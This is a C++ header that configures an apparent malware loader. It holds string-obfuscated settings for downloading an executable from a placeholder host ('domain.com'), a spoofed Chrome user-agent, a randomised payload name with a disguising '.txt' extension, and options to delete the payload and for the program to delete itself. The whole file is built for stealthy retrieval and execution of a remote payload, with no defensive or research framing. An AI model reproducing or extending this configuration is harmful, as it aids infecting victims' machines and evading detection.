#pragma once
#include "obfuscation.h"

#define PAYLOAD_URL OBF(wchar_t, L"domain.com")
#define PAYLOAD_URL_DEST OBF(wchar_t, L"/destination/to/file.exe")
#define PAYLOAD_USER_AGENT OBF(wchar_t, L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36")

#define PAYLOAD_NAME OBF(wchar_t, L"This can be ignored if randompayloadname is set to true")
#define PAYLOAD_FILE_EXTENSION OBF(wchar_t, L".txt")

namespace config
{
	constexpr inline bool randompayloadname = true;

	constexpr inline bool deletepayload = false;
	constexpr inline bool selfedelete = false;
};